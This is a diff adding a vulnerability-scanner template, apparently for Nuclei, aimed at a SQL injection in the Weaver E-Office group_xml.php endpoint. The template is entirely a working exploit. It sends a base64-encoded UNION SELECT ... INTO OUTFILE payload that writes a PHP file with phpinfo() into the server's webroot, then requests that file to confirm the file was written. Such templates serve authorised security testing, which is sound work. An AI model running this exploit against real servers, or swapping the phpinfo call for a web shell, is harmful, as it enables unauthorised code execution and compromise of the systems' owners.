@@ -1,0 +1,40 @@
+id: poc-yaml-weaver-e-office-group-xml-php-sqli
+info:
+  name: 泛微 E-Office group_xml.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+  description: |
+    This template detects an SQL Injection vulnerability in the 泛微 E-Office group_xml.php endpoint, where it is possible to inject SQL payloads leading to potential PHP file creation and execution.
+
+variables:
+  t1: '{{rand_text_alphanumeric(8)}}'
+  t2: "{{base64(concat('[group]:[1]|[groupid]:[1 union select \"<?php phpinfo()?>\",2,3,4,5,6,7,8 into outfile \"../webroot/', t1, '.php\"]'))}}"
+
+http:
+  - id: sqli-injection-test
+    method: GET
+    path:
+      - "{{BaseURL}}/inc/group_user_list/group_xml.php?par={{t2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "mysql_fetch_array()"
+
+  - id: php-file-access-check
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PHP Version"
+          - "PHP API"
